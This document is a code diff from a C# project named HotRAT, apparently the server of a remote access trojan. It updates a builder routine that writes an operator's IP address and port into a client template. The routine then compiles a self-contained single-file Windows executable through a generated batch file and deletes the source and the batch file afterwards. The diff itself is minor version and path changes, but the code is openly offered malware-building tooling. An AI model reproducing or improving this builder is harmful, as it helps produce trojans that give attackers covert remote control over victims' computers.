@@ -34,12 +34,11 @@ namespace HotRAT.Server.Pages
             {
                 string path = "Client\\Template.dll";
                 string csPath = "Client\\Program.cs";
-                File.Copy(path, csPath);
+                File.Copy(path, csPath,true);
                 var content = File.ReadAllText(path);
                 File.WriteAllText(csPath, content.Replace("{IPADDRESS}", ip.Text).Replace("{PORT}", port.Text));
-                string exePath = Path.Combine(Directory.GetCurrentDirectory(), "Client", "dotnet.exe");
                 Process process = new Process();
-                process.StartInfo.FileName = exePath;
+                process.StartInfo.FileName = "dotnet.exe";
                 process.StartInfo.Arguments = "build";
                 process.StartInfo.UseShellExecute = false;
                 process.StartInfo.RedirectStandardOutput = true;
@@ -50,7 +49,7 @@ namespace HotRAT.Server.Pages
                 process.WaitForExit();
 
                 string batFilePath = Path.Combine(Directory.GetCurrentDirectory(), "build.bat");
-                string batContent = "@echo off\r\ncd Client\r\ndotnet.exe publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true\r\ndel /Q Program.cs\r\nstart \"\" \"%cd%\\bin\\Release\\net6.0\\win-x64\\publish\"\r\ndel /Q build.bat";
+                string batContent = "@echo off\r\ncd Client\r\ndotnet.exe publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true\r\ndel /Q Program.cs\r\nstart \"\" \"%cd%\\bin\\Release\\net8.0\\win-x64\\publish\"\r\ndel /Q build.bat";
                 File.WriteAllText(batFilePath, batContent);
 
                 await RunBatchFileAsync(batFilePath);
